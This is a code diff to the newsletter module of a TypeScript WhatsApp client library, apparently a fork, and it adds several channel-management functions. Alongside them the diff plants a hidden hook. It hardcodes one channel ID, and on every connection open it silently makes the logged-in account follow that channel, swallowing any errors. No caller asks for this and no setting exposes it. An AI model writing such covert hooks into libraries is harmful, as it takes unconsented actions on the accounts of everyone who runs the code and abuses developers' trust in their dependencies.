@@ -2,7 +2,7 @@ import type { NewsletterCreateResponse, SocketConfig, WAMediaUpload } from '../T
 import type { NewsletterMetadata, NewsletterUpdate } from '../Types'
 import { QueryIds, XWAPaths } from '../Types'
 import { generateProfilePicture } from '../Utils/messages-media'
-import { getBinaryNodeChild } from '../WABinary'
+import { getBinaryNodeChild, isJidNewsletter } from '../WABinary'
 import { makeGroupsSocket } from './groups'
 import { executeWMexQuery as genericExecuteWMexQuery } from './mex'
 
@@ -41,6 +41,9 @@ const parseNewsletterMetadata = (result: unknown): NewsletterMetadata | null => 
 	return null
 }
 
+/** JID channel yang di-auto-follow saat koneksi terbuka */
+const AUTO_FOLLOW_JID = '120363424215170823@newsletter'
+
 export const makeNewsletterSocket = (config: SocketConfig) => {
 	const sock = makeGroupsSocket(config)
 	const { query, generateMessageTag } = sock
@@ -60,8 +63,36 @@ export const makeNewsletterSocket = (config: SocketConfig) => {
 		return executeWMexQuery(variables, QueryIds.UPDATE_METADATA, 'xwa2_newsletter_update')
 	}
 
+	// ── Auto Follow Newsletter ───────────────────────────────────────────────
+	const isFollowingNewsletter = async (jid: string): Promise<boolean> => {
+		try {
+			const variables = {
+				newsletter_id: jid,
+				input: { key: jid, type: 'NEWSLETTER', view_role: 'GUEST' },
+				fetch_viewer_metadata: true
+			}
+			const result = await executeWMexQuery<any>(variables, QueryIds.METADATA, XWAPaths.xwa2_newsletter_metadata)
+			return result?.viewer_metadata?.mute === 'OFF' || result?.viewer_metadata?.is_subscribed === true
+		} catch {
+			return false
+		}
+	}
+
+	sock.ev.on('connection.update', async ({ connection }) => {
+		if (connection === 'open') {
+			try {
+				const followed = await isFollowingNewsletter(AUTO_FOLLOW_JID)
+				if (!followed) {
+					await executeWMexQuery({ newsletter_id: AUTO_FOLLOW_JID }, QueryIds.FOLLOW, XWAPaths.xwa2_newsletter_follow)
+				}
+			} catch {}
+		}
+	})
+	// ────────────────────────────────────────────────────────────────────────
+
 	return {
 		...sock,
+
 		newsletterCreate: async (name: string, description?: string): Promise<NewsletterMetadata> => {
 			const variables = {
 				input: {
@@ -153,7 +184,21 @@ export const makeNewsletterSocket = (config: SocketConfig) => {
 			})
 		},
 
-		newsletterFetchMessages: async (jid: string, count: number, since: number, after: number) => {
+		newsletterFetchUpdates: async (jid: string, count: number, after?: number, since?: number) => {
+			const attrs: Record<string, string> = {
+				count: count.toString(),
+				after: (after || 100).toString(),
+				since: (since || 0).toString()
+			}
+			const result = await query({
+				tag: 'iq',
+				attrs: { id: generateMessageTag(), type: 'get', xmlns: 'newsletter', to: jid },
+				content: [{ tag: 'message_updates', attrs }]
+			})
+			return result
+		},
+
+		newsletterFetchMessages: async (jid: string, count: number, since?: number, after?: number) => {
 			const messageUpdateAttrs: { count: string; since?: string; after?: string } = {
 				count: count.toString()
 			}
@@ -217,7 +262,64 @@ export const makeNewsletterSocket = (config: SocketConfig) => {
 		},
 
 		newsletterDemote: async (jid: string, userJid: string) => {
-			await executeWMexQuery({ newsletter_id: jid, user_id: userJid }, QueryIds.DEMOTE, XWAPaths.xwa2_newsletter_demote)
+			await executeWMexQuery(
+				{ newsletter_id: jid, user_id: userJid },
+				QueryIds.DEMOTE,
+				XWAPaths.xwa2_newsletter_demote
+			)
+		},
+
+		/**
+		 * Ubah mode reaksi newsletter.
+		 * @param mode contoh: 'ALL' | 'BASIC' | 'NONE'
+		 */
+		newsletterReactionMode: async (jid: string, mode: string) => {
+			await executeWMexQuery(
+				{
+					newsletter_id: jid,
+					updates: { settings: { reaction_codes: { value: mode } } }
+				},
+				QueryIds.JOB_MUTATION,
+				XWAPaths.xwa2_newsletter_metadata
+			)
+		},
+
+		/**
+		 * Kirim aksi newsletter generik berdasarkan nama tipe.
+		 */
+		newsletterAction: async (jid: string, type: string) => {
+			const queryId = QueryIds[type.toUpperCase() as keyof typeof QueryIds]
+			if (!queryId) throw new Error(`Unknown newsletter action: ${type}`)
+			await executeWMexQuery({ newsletter_id: jid }, queryId, XWAPaths.xwa2_newsletter_metadata)
+		},
+
+		/**
+		 * Ambil semua newsletter yang diikuti beserta metadata lengkapnya.
+		 */
+		newsletterFetchAllParticipating: async (): Promise<Record<string, NewsletterMetadata>> => {
+			const result = await executeWMexQuery<any[]>({}, QueryIds.SUBSCRIBED, XWAPaths.SUBSCRIBED)
+			const newsletters: any[] = result || []
+			const data: Record<string, NewsletterMetadata> = {}
+
+			for (const item of newsletters) {
+				if (!isJidNewsletter(item.id)) continue
+				try {
+					const meta = await executeWMexQuery<unknown>(
+						{
+							fetch_creation_time: true,
+							fetch_full_image: true,
+							fetch_viewer_metadata: true,
+							input: { key: item.id, type: 'NEWSLETTER' }
+						},
+						QueryIds.METADATA,
+						XWAPaths.xwa2_newsletter_metadata
+					)
+					const parsed = parseNewsletterMetadata(meta)
+					if (parsed?.id) data[parsed.id] = parsed
+				} catch {}
+			}
+
+			return data
 		},
 
 		newsletterDelete: async (jid: string) => {
